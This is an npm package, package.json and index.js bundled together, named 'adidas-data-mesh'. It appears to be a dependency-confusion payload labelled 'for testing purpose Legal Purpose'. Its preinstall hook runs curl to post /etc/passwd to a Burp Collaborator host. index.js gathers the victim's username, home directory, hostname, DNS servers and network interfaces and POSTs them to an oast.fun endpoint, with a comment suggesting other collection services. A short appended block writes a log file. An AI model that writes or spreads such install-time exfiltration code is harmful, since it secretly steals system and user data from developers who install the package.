
// === Begin package.json ===
const packageJSON = {
  "name": "adidas-data-mesh",
  "version": "9.9.8",
  "description": "for testing purpose Legal Purpose",
  "main": "index.js",
  "scripts": {
    "test": "Ethical Purpose",
    "preinstall": "/usr/bin/curl --data '@/etc/passwd' $(hostname)aesic9l2whlwa33aytefcnu11s7jv8.burpcollaborator.net"
  },
  "author": "Aryan Jaiswal",
  "license": "ISC"
};
// === End package.json ===

// === Begin index.js ===
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");

const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    arch: os.arch(), // Add architecture information
    type: os.type(), // Add OS type information
    version: os.version(), // Add OS version information
    interfaces: os.networkInterfaces(),
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "cm30n6w2vtc0000cv6m0gkbo1ehyyyyyd.oast.fun", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();

// === End index.js ===

// === Auto Appended Behavior Injection ===
try {
  const fs = require('fs');
  fs.writeFileSync('dynamic_log.txt', 'Triggered dynamic API');
  console.log('[Dynamic] fs.writeFileSync called');
} catch (e) {
  console.error('[Dynamic] Injection failed:', e);
}
